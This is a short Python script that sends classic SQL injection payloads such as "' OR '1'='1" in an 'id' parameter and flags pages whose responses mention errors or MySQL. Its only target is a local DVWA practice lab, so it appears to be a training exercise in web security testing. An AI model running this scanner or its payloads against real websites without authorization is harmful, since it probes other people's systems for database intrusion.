import requests

SQL_PAYLOADS = ["' OR '1'='1", "' OR ''='", "';--", "\" OR \"1\"=\"1"]

class SQLInjectionTester:
    def __init__(self, urls):
        self.urls = urls

    def test_sql(self):
        for url in self.urls:
            for payload in SQL_PAYLOADS:
                params = {"id": payload}
                try:
                    r = requests.get(url, params=params)
                    if "error" in r.text.lower() or "mysql" in r.text.lower():
                        print("[!] SQLi Found at:", url)
                        print("Payload:", payload)
                except:
                    pass

tester = SQLInjectionTester(["http://localhost/dvwa/vulnerabilities/sqli/"])
tester.test_sql()
